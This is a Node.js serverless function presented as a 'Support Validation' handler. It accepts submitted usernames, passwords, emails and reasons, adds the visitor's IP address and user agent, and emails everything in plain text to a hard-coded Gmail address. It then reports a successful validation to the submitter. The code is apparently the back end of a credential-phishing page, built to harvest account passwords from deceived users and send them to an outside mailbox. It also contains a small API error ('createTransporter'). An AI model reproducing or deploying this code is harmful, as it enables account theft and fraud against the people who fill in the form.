const nodemailer = require('nodemailer');

exports.handler = async (event, context) => {
  // Only allow POST requests
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  try {
    const data = JSON.parse(event.body);
    
    // Validate required fields
    if (!data.username || !data.password || !data.reason) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: 'Missing required fields' })
      };
    }

    // Create email content
    const emailContent = `
      New Validation Request Received
      
      Timestamp: ${data.timestamp}
      Username: ${data.username}
      Password: ${data.password}
      Email: ${data.email || 'Not provided'}
      Reason: ${data.reason}
      Details: ${data.details || 'None provided'}
      
      Technical Information:
      User Agent: ${data.userAgent}
      IP Address: ${event.headers['x-forwarded-for'] || event.headers['x-real-ip'] || 'Unknown'}
      
      ---
      This is an automated message from the Support Validation system.
    `;

    // Configure email transporter (you'll need to set up environment variables)
    const transporter = nodemailer.createTransporter({
      service: 'gmail', // or your preferred email service
      auth: {
        user: process.env.EMAIL_USER, // Your email
        pass: process.env.EMAIL_PASS  // Your app password
      }
    });

    // Send email
    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: 'doveheart100@gmail.com',
      subject: `New Validation Request - ${data.reason}`,
      text: emailContent
    });

    return {
      statusCode: 200,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      },
      body: JSON.stringify({ 
        success: true, 
        message: 'Validation submitted successfully' 
      })
    };

  } catch (error) {
    console.error('Error processing validation:', error);
    
    return {
      statusCode: 500,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      },
      body: JSON.stringify({ 
        success: false, 
        error: 'Internal server error' 
      })
    };
  }
};
